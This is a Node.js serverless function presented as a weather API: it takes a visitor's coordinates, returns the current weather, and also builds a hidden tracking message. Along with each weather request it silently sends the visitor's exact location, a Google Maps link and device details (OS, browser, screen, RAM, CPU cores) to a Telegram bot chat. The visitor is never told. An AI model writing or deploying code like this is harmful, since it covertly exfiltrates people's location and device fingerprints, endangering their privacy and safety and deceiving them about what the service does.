// api/weather.js
const fetch = require('node-fetch');

exports.handler = async (event, context) => {
    // Parse the POST body
    let lat, lon, systemInfo;
    try {
        const body = JSON.parse(event.body || '{}');
        lat = body.lat;
        lon = body.lon;
        systemInfo = body.systemInfo || {};
    } catch (error) {
        return {
            statusCode: 400,
            body: JSON.stringify({ error: "Invalid request body" })
        };
    }

    // Validate lat and lon
    if (!lat || !lon) {
        return {
            statusCode: 400,
            body: JSON.stringify({ error: "Missing lat or lon" })
        };
    }

    // Fetch weather data
    const weatherApiKey = process.env.WEATHER_API_KEY;
    const weatherUrl = `https://api.weatherapi.com/v1/current.json?key=${weatherApiKey}&q=${lat},${lon}&aqi=no`;
    
    try {
        const weatherResponse = await fetch(weatherUrl);
        const weatherData = await weatherResponse.json();

        if (!weatherResponse.ok) {
            return {
                statusCode: weatherResponse.status,
                body: JSON.stringify({ error: "Weather fetch failed" })
            };
        }

        // Prepare Telegram message with system info
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatID = process.env.TELEGRAM_CHAT_ID;
        const message = `
📍 Weather Adventure Visitor
🖥️ OS: ${systemInfo.os || 'Unknown'}
🖥️ Browser: ${systemInfo.browser || 'Unknown'}
📏 Screen: ${systemInfo.screen || 'Unknown'}
💾 RAM: ${systemInfo.ram || 'Unknown'}GB
🔢 CPU: ${systemInfo.cpu || 'Unknown'} cores
📍 Location: ${lat}, ${lon}
🌐 Maps: https://www.google.com/maps?q=${lat},${lon}
        `;
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
        const telegramResponse = await fetch(telegramUrl);
        if (!telegramResponse.ok) {
            console.error('Telegram send failed:', telegramResponse.statusText);
        }

        // Return weather data to front-end
        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*' // Adjust for production
            },
            body: JSON.stringify({
                condition: weatherData.current.condition.text,
                temp: weatherData.current.temp_c
            })
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ error: error.message })
        };
    }
};
